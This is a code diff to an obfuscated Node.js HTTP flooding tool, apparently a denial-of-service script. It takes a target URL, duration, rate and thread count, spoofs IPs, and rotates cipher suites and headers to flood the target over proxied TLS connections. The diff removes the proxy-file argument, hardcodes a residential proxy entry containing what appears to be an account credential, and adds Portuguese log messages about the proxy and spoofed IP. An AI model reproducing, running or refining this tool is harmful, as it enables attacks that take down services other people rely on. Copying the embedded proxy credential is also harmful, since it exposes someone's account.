@@ -12,9 +12,9 @@ process.on('unhandledRejection', errorHandler)
 process.setMaxListeners(0)
 require('events').EventEmitter.defaultMaxListeners = 0
 process.on('uncaughtException', function (_0x5b52ed) {})
-process.argv.length < 7 &&
+process.argv.length < 6 &&
   (console.log('\n\n '),
-  console.log('Usage: target time rate thread proxyfile'),
+  console.log('Usage: target time rate thread'),
   process.exit())
 const headers = {}
 function readLines(_0x13eb0a) {
@@ -56,8 +56,7 @@ const ip_spoof = () => {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
-    threads: parseInt(process.argv[5]),
-    proxyFile: process.argv[6],
+    threads: parseInt(process.argv[5])
   },
   sig = [
     'rsa_pss_rsae_sha256',
@@ -2854,7 +2853,7 @@ var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
     control_header[
       Math.floor(Math.floor(Math.random() * control_header.length))
     ],
-  proxies = readLines(args.proxyFile)
+  proxies = ['proxy.geonode.io:9000:geonode_FEATFBO4do-type-residential:39962277-ce8f-4d08-9aa6-b52b163ab34c']
 const parsedTarget = url.parse(args.target),
   rateHeaders = [
     { 'A-IM': 'Feed' },
@@ -2900,7 +2899,8 @@ if (cluster.isMaster) {
   console.log('Time: '.brightYellow + process.argv[3])
   console.log('Rate: '.brightYellow + process.argv[4])
   console.log('Thread: '.brightYellow + process.argv[5])
-  console.log('ProxyFile: '.brightYellow + process.argv[6])
+  console.log('Proxy Base: '.brightYellow + proxies[0])
+  console.log('IP Inicial: '.brightYellow + spoofed)
   console.log('--------------------------------------------'.gray)
   console.log('Note: '.brightCyan + tipsz)
   for (let counter = 1; counter <= args.threads; counter++) {
@@ -2983,10 +2983,14 @@ function runFlooder() {
       address: parsedTarget.host + ':443',
       timeout: 100,
     }
+  console.log('Usando Proxy IP: '.brightBlue + _0x2cb5cb[0] + ':' + _0x2cb5cb[1])
+  console.log('IP Spoofed: '.brightBlue + spoofed)
   Socker.HTTP(_0x301131, (_0x4fef99, _0x3a0124) => {
     if (_0x3a0124) {
+      console.log('Erro na Proxy: '.red + _0x3a0124)
       return
     }
+    console.log('Proxy Conectada com Sucesso! IP: '.green + _0x2cb5cb[0])
     _0x4fef99.setKeepAlive(true, 600000)
     const _0xe69cc7 = {
         host: parsedTarget.host,
